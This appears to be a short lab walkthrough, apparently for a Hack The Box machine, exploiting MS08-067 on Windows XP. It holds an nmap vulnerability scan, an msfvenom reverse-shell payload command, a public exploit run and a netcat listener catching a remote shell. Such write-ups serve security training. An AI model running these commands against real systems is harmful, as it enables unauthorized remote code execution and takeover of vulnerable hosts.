# Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)

## Scanning

```
$ nmap -p 139,445 --script smb-vul* 10.10.10.4 -Pn
<snip>
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
```

## Modify exploit

In the poc, REPLACE THIS SHELLCODE with shellcode generated for your use.

> The bad chars "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

Convert poc to python3

```
2to3 ms08-067.py
```

## Get Reverse shell

```
$ python3 ms08-067.py 10.10.10.4 6 445
<snip>

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

```
┌──(Hades㉿10.10.14.6)-[0.6:19.2]~
└─$ sudo nc -nvlp 443
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.4] 1031
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

## Reference

[https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py)

[https://github.com/leecybersec/walkthrough/tree/master/hackthebox/legacy](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/legacy)